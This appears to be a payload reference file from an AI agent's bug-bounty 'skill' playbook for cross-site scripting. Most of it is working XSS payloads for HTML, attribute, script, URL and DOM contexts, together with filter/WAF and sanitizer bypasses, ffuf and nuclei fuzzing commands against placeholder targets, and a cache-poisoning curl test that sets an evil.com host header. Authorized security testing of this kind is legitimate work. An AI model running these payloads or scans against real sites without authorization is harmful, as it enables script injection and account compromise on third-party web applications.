# XSS — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- HTML body -> `<svg onload=alert(document.domain)>` `<img src=x onerror=alert(1)>`

- Attribute -> `" autofocus onfocus=alert(1) x="` `' onmouseover='alert(1)`

- JS string -> `';alert(1)//` `\';alert(1)//` `</script><script>alert(1)</script>`

- URL sink -> `javascript:alert(1)` `data:text/html,<script>alert(1)</script>` `vbscript:msgbox(1)`

- Markdown -> `[x](javascript:alert(1))` `![x](x" onerror="alert(1))`

- Angular -> `{{constructor.constructor('alert(1)')()}}`

- mXSS -> `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`



## Payload bank



**89 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### HTML injection — body



```text

<script>alert(document.domain)</script>

<script>alert(1)</script>

<img src=x onerror=alert(document.domain)>

<svg onload=alert(document.domain)>

<svg/onload=alert(1)>

<body onload=alert(1)>

<iframe srcdoc="<script>alert(parent.document.domain)</script>">

<details open ontoggle=alert(1)>

<video><source onerror=alert(1)>

<audio src=x onerror=alert(1)>

<input autofocus onfocus=alert(1)>

<marquee onstart=alert(1)>

<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<form><button formaction=javascript:alert(1)>X</button>

<object data="javascript:alert(1)">

<embed src="javascript:alert(1)">

<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<svg><set attributeName=onmouseover to=alert(1)>

<svg><script>alert(1)</script></svg>

<xss autofocus tabindex=1 onfocusin=alert(1)>

```



### Attribute breakout



```text

"><img src=x onerror=alert(1)>

'><img src=x onerror=alert(1)>

" autofocus onfocus=alert(1) x="

' autofocus onfocus='alert(1)' x='

" onmouseover="alert(1)

' onmouseover='alert(1)

"><svg onload=alert(1)>

"><script>alert(1)</script>

"><iframe src=javascript:alert(1)>

` onmouseover=alert(1) `

</title><script>alert(1)</script>

</textarea><script>alert(1)</script>

</style><script>alert(1)</script>

</xmp><script>alert(1)</script>

```



### JavaScript string / script context



```text

';alert(1)//

\';alert(1)//

";alert(1)//

</script><script>alert(1)</script>

</script><svg onload=alert(1)>

'-alert(1)-'

'-alert(1)//

${alert(1)}

#{alert(1)}

\u003cscript\u003ealert(1)\u003c/script\u003e

\x3cscript\x3ealert(1)\x3c/script\x3e

\u0000<script>alert(1)</script>

```



### URL, CSS & markup sinks



```text

javascript:alert(1)

javascript://%0aalert(1)

javas&#99;ript:alert(1)

java	script:alert(1)

java\nscript:alert(1)

data:text/html,<script>alert(1)</script>

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

vbscript:msgbox(1)

<a href="javascript:alert(1)">x</a>

<a href="data:text/html,<script>alert(1)</script>">x</a>

<base href="javascript:/a/-alert(1)//">

<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<link rel=stylesheet href=javascript:alert(1)>

<div style="background:url(javascript:alert(1))">

<style>@import 'javascript:alert(1)';</style>

```



### Filter & WAF bypass



```text

<scr<script>ipt>alert(1)</scr</script>ipt>

<ScRiPt>alert(1)</sCrIpT>

<<script>script>alert(1)<</script>/script>

<img/src=x/onerror=alert(1)>

<img src=x onerror=alert(1)////>

<svg%0aonload=alert(1)>

%3Cscript%3Ealert(1)%3C/script%3E

%253Cscript%253Ealert(1)%253C/script%253E

&lt;script&gt;alert(1)&lt;/script&gt;

<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<svg onload=confirm`1`>

<svg onload=alert(1) >

<img src=x onerror=alert(1)%00>

<img src=x onerror=alert(1)<!-->

<img src=x onerror=alert(1)<!--->

<a href="&#x6a;avascript:alert(1)">x</a>

<img src=x onerror=&#x61;lert(1)>

```



### DOM & framework sinks



```text

#<img src=x onerror=alert(1)>

#javascript:alert(document.domain)

?next=javascript:alert(1)

{"html":"<img src=x onerror=alert(1)>"}

{"type":"message","data":"<img src=x onerror=alert(1)>"}

{{constructor.constructor('alert(1)')()}}

{{$eval.constructor('alert(1)')()}}

{{_openBlock.constructor('alert(1)')()}}

<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` (89)

- `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` (18 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 18× | `javascript:` |

| 5× | `alert(document.domain)` |

| 5× | `<script>` |

| 5× | `<a>` |

| 4× | `alert(1)` |

| 4× | `escapeHTML()` |

| 3× | `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;` |

| 3× | `<script>alert(document.domain)</script>` |

| 3× | `attacker@example.com` |

| 3× | `wp_targeted_link_rel()` |

| 3× | `alert()` |

| 3× | `<img>` |

| 3× | `<svg>` |

| 3× | `__proto__` |

| 2× | `javascript:alert(1);` |

| 2× | `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>` |

| 2× | `javascript://%0aalert(1)` |

| 2× | `<.*` |

| 2× | `\b \f \n \r \t` |

| 2× | `<%&lt;script/src=//...?` |



## Parameters observed



`url` · `signature` · `_m` · `code` · `redirect_uri` · `token` · `error` · `mode` · `canary` · `callback` · `name` · `hash` · `catalogId` · `langId` · `sso` · `ssoAction` · `client_id` · `error_description` · `search` · `_v`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_xss.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_xss.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` | 89 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` | 18 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_xss.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xss.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xss.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Run the DAST XSS templates against every reflected parameter; add cookies/headers for authenticated surfaces.



```sh

nuclei -u https://target -tags xss,csp-bypass \

       -severity low,medium,high,critical -rl 40 -o nuclei_xss.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xss -dast \

       -rl 40 -o nuclei_xss_xss.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_xss_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Basic context probing:**

```html

aaa"bbb'ccc<ddd>eee`fff

```



**Reflected XSS — URL parameter baseline:**

```

?q=<script>alert(document.domain)</script>

?q="><script>alert(1)</script>

?utm_source=<svg onload=alert(1)>

?redirect=javascript:alert(document.domain)

```



**Attribute context escapes:**

```html

" onmouseover="alert(1)

' onmouseover='alert(1)

`onmouseover=alert(1)

```



**SVG-based (CSP bypass):**

```html

<svg xmlns="http://www.w3.org/2000/svg">

  <script>alert(document.domain)</script>

</svg>

```



**Sanitizer bypass — math+style combo:**

```html

<math><style><img src=x onerror=alert(1)></style></math>

```



**Sanitizer bypass — svg+style combo:**

```html

<svg><style><img src=x onerror=alert(1)></style></svg>

```



**Markdown/RDoc javascript: link:**

```markdown

[Click me](javascript:alert(document.domain))

```



**Kroki/diagram injection:**

```

```kroki

plantuml

@startuml

:<script>alert(1)</script>;

@enduml

```

```



**DOM XSS via hash/search:**

```javascript

// In browser console to test sink

location.hash = '#"><img src=x onerror=alert(1)>'

location.href = 'https://target.com/page#<script>alert(1)</script>'

```



**Grep patterns for source review:**

```bash

# Find dangerous sinks in JS

grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"



# Find unsafe Rails helpers

grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"



# Find reflected params in responses

grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r

```



**Curl to detect reflection:**

```bash

curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"

curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"

```



**Cache poisoning test:**

```bash

# Send payload then fetch with clean session to see if cached

curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"

curl -sk "https://target.com/page" | grep -i "evil.com"

```



---

## Additional payload source: ShadowByte1/XSS (added 2026-11-23)

Repo: https://github.com/ShadowByte1/XSS/ (Apache-2.0, 139 stars).
Local copies in this skill dir: `references/payloads_ShadowByte1/`

| File | Entries | Notes |
|---|---:|---|
| `Large_XSS_Payloads.txt` | 2899 | largest bank: HTML entities, null-byte, CRLF, polyglots, obfuscation |
| `More_XSS_Payloads.txt` | 69 | extra context-specific probes |
| `Small_Payload_List.txt` | 27 | quick first-pass set |
| `XSS_WAF_Bypass_List.txt` | 100 | filter/WAF-focused variants |

Use for bulk reflection testing, then minimize. Remember: reflected-but-encoded (`&lt;`) is NOT XSS, and CSP (e.g. `script-src 'self'` with no `unsafe-inline`) blocks inline event handlers and `<script>` even when raw reflected — verify in a real browser before claiming.
